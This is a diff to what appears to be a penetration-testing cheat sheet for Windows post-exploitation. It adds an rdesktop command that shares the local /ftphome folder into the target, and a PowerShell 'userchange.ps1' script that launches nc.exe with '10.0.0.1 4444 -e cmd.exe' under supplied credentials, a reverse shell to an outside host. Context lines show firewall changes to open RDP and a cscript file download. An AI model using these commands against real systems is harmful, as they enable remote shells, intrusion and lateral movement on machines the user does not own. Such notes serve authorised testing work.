@@ -31,6 +31,11 @@ Remote Desktop service to allow RDP traffic. [TCP 3389] added by LogicDaemon's s
 profile=private,domain localport=3389 protocol=tcp
 ```
 
+- Connect to windows RDP
+```
+rdesktop -g 95% -u user -p password 10.0.0.1 -r disk:share=/ftphome
+```
+
 ## File Upload
 
 - PowerShell download and execute
@@ -51,4 +56,13 @@ WScript.Echo(WinHttpReq.ResponseText);
   - execute
 ```
 cscript /nologo fu.js http://ip/bullshit > uploaded_file
+```
+
+## Change user
+- userchange.ps1
+```
+$secpasswd = ConvertTo-SecureString "passwordhere" -AsPlainText -Force
+$mycreds = New-Object System.Management.Automation.PSCredential ("usernamehere", $secpasswd)
+$computer = "Hostnamehere"
+[System.Diagnostics.Process]::Start("c:\temp\nc.exe","10.0.0.1 4444 -e cmd.exe",$mycreds.Username, $mycreds.Password, $computer)
 ```
